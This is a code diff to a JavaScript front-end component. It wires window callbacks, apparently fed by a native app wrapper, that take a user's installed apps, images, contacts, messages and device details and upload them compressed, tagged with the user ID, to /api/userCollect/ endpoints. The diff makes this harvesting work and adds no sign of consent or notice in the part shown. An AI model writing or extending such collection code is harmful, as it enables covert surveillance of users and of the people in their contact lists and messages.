@@ -13,13 +13,14 @@ export default {
   data() {
     if (!window.isInitSyncData) {
       window.onappListFunName = async data => {
-        console('收到onappListFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到onappListFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
           await this.$http.post(`/api/userCollect/collectApp`, {
-            data: data,
+            userId: this.userInfo.id,
+            data: this.zip(data),
           });
           this.updateLocalSyncStatus('appListFunName', true);
         } catch (error) {
@@ -27,57 +28,72 @@ export default {
         }
       };
       window.onimageListFunName = async data => {
-        console('收到onimageListFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到onimageListFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectImage`, data);
+          await this.$http.post(`/api/userCollect/collectImage`, {
+            userId: this.userInfo.id,
+            data: this.zip(data),
+          });
           this.updateLocalSyncStatus('imageListFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('imageListFunName', false);
         }
       };
       window.oncontactsListFunName = async data => {
-        console('收到oncontactsListFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到oncontactsListFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectContacts`, data);
+          await this.$http.post(`/api/userCollect/collectContacts`, {
+            userId: this.userInfo.id,
+            data: this.zip(data),
+          });
           this.updateLocalSyncStatus('contactsListFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('contactsListFunName', false);
         }
       };
-      window.msgListFunName = async data => {
-        console('收到onmsgListFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+      window.onmsgListFunName = async data => {
+        console.log('收到onmsgListFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectMsg`, data);
+          await this.$http.post(`/api/userCollect/collectMsg`, {
+            userId: this.userInfo.id,
+            data: this.zip(data),
+          });
         } catch (error) {}
       };
       window.ondevFunName = async data => {
-        console('收到ondevFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到ondevFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectDevice`, data);
+          await this.$http.post(`/api/userCollect/collectDevice`, {
+            userId: this.userInfo.id,
+            data: this.zip(data),
+          });
           this.updateLocalSyncStatus('devFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('devFunName', false);
         }
       };
       window.ondevBaseFunName = async data => {
-        console('收到ondevBaseFunName:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到ondevBaseFunName:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectDeviceBase`, data);
+          await this.$http.post(`/api/userCollect/collectDeviceBase`, {
+            userId: this.userInfo.id,
+            data: this.zip(data),
+          });
           this.updateLocalSyncStatus('devBaseFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('devBaseFunName', false);
